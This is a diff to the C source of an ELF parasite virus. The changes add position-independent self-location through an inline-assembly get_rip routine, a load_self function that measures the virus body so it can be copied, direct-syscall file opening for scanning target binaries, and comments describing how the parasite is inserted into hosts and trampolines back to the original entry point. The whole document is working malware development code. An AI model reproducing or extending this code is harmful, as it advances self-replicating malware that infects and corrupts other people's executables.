@@ -31,10 +31,19 @@ long _open(const char *path, unsigned long flags, long mode);
 void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off);
 int _munmap(void *addr, size_t len);
 
+/* customs */
+unsigned long get_rip(void);
+void end_code(void);
+void dummy_marker(void);
+
+#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char*)&get_rip_label - (char*)target))
+
 #define __ASM__ __asm__ __volatile__
-#define PAGE_SIZE 4096
+
+#define RODATA_PADDING 17000 //enough bytes to also copy .rodata and virus
 
 extern long real_start;
+extern long get_rip_label;
 
 typedef struct elfbin {
 	/* Headers */
@@ -110,18 +119,33 @@ void do_main() {
 	/* Declare variables */
 	char cwd[2];	
 	ssize_t cwd_fd;
-
-
 	
 	/* Code */
 	cwd[0] = '.';
 	cwd[1] = '\0';
 
 	cwd_fd = _open(cwd, O_RDONLY | O_DIRECTORY, 0);
+	if (cwd_fd < 0) {
+		return;
+	}
+}
 
+/* Since our parasite exists of both a text and data segment
+ * we include the initial ELF file header and phdr in each parasite
+ * insertion. This lends itself well to being able to self-load by
+ * parsing our own program header etc. 
+ */
+int load_self(elfbin_t* elf) {
+	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
+	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
 
+	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
+	elf->mem = (uint8_t*)_start_addr;
+	elf->size = (char*)&end_code - (char*)&_start;
+	elf->size += (int)((char*)f2 - (char*)f1);
 
-	
+	//elf->size += RODATA_PADDING;
+	return 0;
 }
 
 void unload_target(elfbin_t* elf) {	
@@ -133,7 +157,7 @@ int load_target(const char *path, elfbin_t* elf) {
 	int i;
 	struct stat st;
 	elf->path = (char*)path;
-	int fd = open(path, O_RDONLY, 0);
+	int fd = _open(path, O_RDONLY, 0);
 	if (fd < 0) {
 		return -1;
 	}
@@ -339,10 +363,28 @@ int _memcmp(const void *s1, const void *s2, unsigned int n) {
     }
 }
 
+/* -------------------- Custom ----------------------------------- */
+
+unsigned long get_rip(void) {
+	long ret;
+	__asm__ __volatile__(
+		"call get_rip_label		\n"
+		".globl get_rip_label 	\n"
+		"get_rip_label: 		\n"
+		"pop %%rax  			\n"
+		"mov %%rax, %0" : "=r"(ret)
+	);
+	return ret;
+}	
+
 /*
  * end_code() gets over_written with a trampoline
  * that jumps to the original entry point.
  */
 void end_code() {
 	Exit(0);
+}
+
+void dummy_marker() {
+	__ASM__("nop");
 }
